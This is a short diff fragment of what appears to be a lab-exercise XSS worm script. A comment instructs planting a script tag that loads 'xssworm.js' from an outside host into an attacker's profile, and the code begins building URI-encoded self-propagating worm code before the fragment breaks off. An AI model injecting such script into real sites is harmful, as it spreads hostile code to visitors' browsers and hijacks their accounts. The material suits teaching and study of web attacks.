@@ -3,7 +3,7 @@ Put this line below in the attacker's profile:
 <script type="text/javascript" src="http://example60.com/xssworm.js"></script>
 */
 window.onload = function(){
-    alert("I'm triggered");
+    alert("Script Injected!!");
 
   // Put all the pieces together, and apply the URI encoding
   var wormCode = encodeURIComponent(
